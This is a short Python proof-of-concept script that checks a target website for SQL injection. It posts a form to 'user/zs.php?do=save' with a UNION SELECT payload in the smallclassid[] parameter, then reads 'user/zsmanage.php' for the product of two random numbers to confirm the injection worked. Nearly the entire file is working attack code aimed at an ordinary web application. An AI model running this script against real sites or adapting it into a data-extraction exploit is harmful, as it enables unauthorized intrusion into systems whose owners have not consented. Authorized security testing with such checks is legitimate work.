import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
r00=randomLowercase(6)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
r11=randomInt(40000, 44800)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
r2=randomInt(40000, 44800)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"user/zs.php?do=save"
	body="proname="+r00+"&tz=1%E4%B8%87%E4%BB%A5%E4%B8%8B&prouse="+r00+"&sx%5B%5D=&sx%5B%5D=&sm="+r00+"&province=%E5%85%A8%E5%9B%BD&city=%E5%85%A8%E5%9B%BD%E5%90%84%E5%9C%B0%E5%8C%BA&xiancheng=&cityforadd=&img=%2Fimage%2Fnopic.gif&flv=&zc=&yq=&action=add&Submit=%E5%A1%AB%E5%A5%BD%E4%BA%86%EF%BC%8C%E5%8F%91%E5%B8%83%E4%BF%A1%E6%81%AF&smallclassid[]=1&smallclassid[]=2)%20union%20select%20"+str(r11)+"*"+str(r2)+"%23"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200:
		r0=True
	else:
		r0=False
	url=baseurl+"user/zsmanage.php"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and str(r11 * r2) in response.text:
		r1=True
	else:
		r1=False
	if r0 and r1:
		return True
	else:
		return False
